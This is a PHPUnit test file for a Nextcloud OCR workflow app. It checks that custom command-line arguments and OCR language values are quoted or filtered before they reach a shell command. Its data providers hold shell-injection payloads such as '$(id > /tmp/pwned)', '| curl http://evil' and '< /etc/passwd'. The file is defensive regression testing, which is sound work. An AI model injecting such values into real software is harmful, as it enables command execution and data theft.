<?php

declare(strict_types=1);

/**
 * @copyright Copyright (c) 2026 Robin Windey <ro.windey@gmail.com>
 *
 *  @license GNU AGPL version 3 or any later version
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

namespace OCA\WorkflowOcr\Tests\Unit\OcrProcessors;

use OCA\WorkflowOcr\Model\GlobalSettings;
use OCA\WorkflowOcr\Model\WorkflowSettings;
use OCA\WorkflowOcr\OcrProcessors\CommandLineUtils;
use OCA\WorkflowOcr\Service\IOcrBackendInfoService;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\MockObject\MockObject;
use PHPUnit\Framework\TestCase;
use Psr\Log\LoggerInterface;

class CommandLineUtilsTest extends TestCase {
	/** @var IOcrBackendInfoService|MockObject */
	private $ocrBackendInfoService;
	/** @var LoggerInterface|MockObject */
	private $logger;
	private CommandLineUtils $commandLineUtils;

	protected function setUp(): void {
		$this->ocrBackendInfoService = $this->createMock(IOcrBackendInfoService::class);
		$this->ocrBackendInfoService->method('isRemoteBackend')->willReturn(false);
		$this->logger = $this->createMock(LoggerInterface::class);

		$this->commandLineUtils = new CommandLineUtils($this->ocrBackendInfoService, $this->logger);
	}

	public function testValidLanguagesAreIncludedInCommandline(): void {
		$settings = new WorkflowSettings('{"languages":["eng","deu"]}');
		$globalSettings = new GlobalSettings();

		$result = $this->commandLineUtils->getCommandlineArgs($settings, $globalSettings);

		$this->assertStringContainsString('--language eng+deu', $result);
	}

	/**
	 * Defense-in-depth regression test for the OS command injection reported via
	 * `languages`: even if a WorkflowSettings instance somehow carries a malicious
	 * language value (e.g. a workflow stored before input validation was added),
	 * CommandLineUtils must never let it reach the shell command string.
	 */
	#[DataProvider('dataProvider_testCustomCliArgsAreLeftUnchanged')]
	public function testValidCustomCliArgsAreLeftUnchanged(string $customCliArgs): void {
		$settings = new WorkflowSettings(json_encode(['customCliArgs' => $customCliArgs]));
		$globalSettings = new GlobalSettings();

		$result = $this->commandLineUtils->getCommandlineArgs($settings, $globalSettings);

		$this->assertStringEndsWith($customCliArgs, $result);
	}

	public static function dataProvider_testCustomCliArgsAreLeftUnchanged(): array {
		return [
			['--dpi 300'],
			['--output-type pdf'],
			['--rotate-pages-threshold 8'],
			['--user-words /tmp/words.txt'],
		];
	}

	public function testQuotedCustomCliArgValueIsPassedAsSingleArgument(): void {
		$settings = new WorkflowSettings('{"customCliArgs": "--title \\"My Document\\""}');
		$globalSettings = new GlobalSettings();

		$result = $this->commandLineUtils->getCommandlineArgs($settings, $globalSettings);

		$this->assertStringEndsWith("--title 'My Document'", $result);
	}

	/**
	 * Regression test for the OS command injection via `customCliArgs`: the value is
	 * concatenated into a shell command string, so every token containing shell
	 * metacharacters must end up quoted and therefore inert.
	 */
	#[DataProvider('dataProvider_testMaliciousCustomCliArgs')]
	public function testMaliciousCustomCliArgsAreQuoted(string $customCliArgs, string $expectedQuotedToken): void {
		$settings = $this->createMock(WorkflowSettings::class);
		$settings->method('getLanguages')->willReturn([]);
		$settings->method('getOcrMode')->willReturn(WorkflowSettings::OCR_MODE_SKIP_TEXT);
		$settings->method('getRemoveBackground')->willReturn(false);
		$settings->method('getCustomCliArgs')->willReturn($customCliArgs);
		$globalSettings = new GlobalSettings();

		$result = $this->commandLineUtils->getCommandlineArgs($settings, $globalSettings);

		$this->assertStringContainsString($expectedQuotedToken, $result);
	}

	public static function dataProvider_testMaliciousCustomCliArgs(): array {
		return [
			['$(id > /tmp/pwned)', "'\$(id'"],
			['`id`', "'`id`'"],
			['--dpi 300 | curl http://evil', "'|'"],
			['--dpi 300 & sleep 10', "'&'"],
			['--dpi 300 && id', "'&&'"],
			['--dpi 300 > /tmp/pwned', "'>'"],
			['--dpi 300 < /etc/passwd', "'<'"],
			['x; id', "'x;'"],
		];
	}

	public function testNewlineInCustomCliArgsIsRemovedByTokenization(): void {
		$settings = $this->createMock(WorkflowSettings::class);
		$settings->method('getLanguages')->willReturn([]);
		$settings->method('getOcrMode')->willReturn(WorkflowSettings::OCR_MODE_SKIP_TEXT);
		$settings->method('getRemoveBackground')->willReturn(false);
		$settings->method('getCustomCliArgs')->willReturn("--dpi 300\nid");
		$globalSettings = new GlobalSettings();

		$result = $this->commandLineUtils->getCommandlineArgs($settings, $globalSettings);

		// The newline is a token separator, so it never reaches the shell command string
		$this->assertStringNotContainsString("\n", $result);
		$this->assertStringEndsWith('--dpi 300 id', $result);
	}

	public function testSidecarFilePathIsQuotedIfNecessary(): void {
		$settings = new WorkflowSettings();
		$globalSettings = new GlobalSettings();

		$result = $this->commandLineUtils->getCommandlineArgs($settings, $globalSettings, '/tmp/dir with spaces/sidecar');

		$this->assertStringContainsString("--sidecar '/tmp/dir with spaces/sidecar'", $result);
	}

	public function testUnproblematicSidecarFilePathIsNotQuoted(): void {
		$settings = new WorkflowSettings();
		$globalSettings = new GlobalSettings();

		$result = $this->commandLineUtils->getCommandlineArgs($settings, $globalSettings, '/tmp/sidecar.txt');

		$this->assertStringContainsString('--sidecar /tmp/sidecar.txt', $result);
	}

	public function testMaliciousLanguageValueIsFilteredOutOfCommandline(): void {
		$settings = $this->createMock(WorkflowSettings::class);
		$settings->method('getLanguages')->willReturn(['eng', 'x ; id > /tmp/pwned ; echo z']);
		$settings->method('getOcrMode')->willReturn(WorkflowSettings::OCR_MODE_SKIP_TEXT);
		$settings->method('getRemoveBackground')->willReturn(false);
		$settings->method('getCustomCliArgs')->willReturn('');
		$globalSettings = new GlobalSettings();

		$result = $this->commandLineUtils->getCommandlineArgs($settings, $globalSettings);

		$this->assertStringContainsString('--language eng', $result);
		$this->assertStringNotContainsString(';', $result);
		$this->assertStringNotContainsString('id >', $result);
	}
}
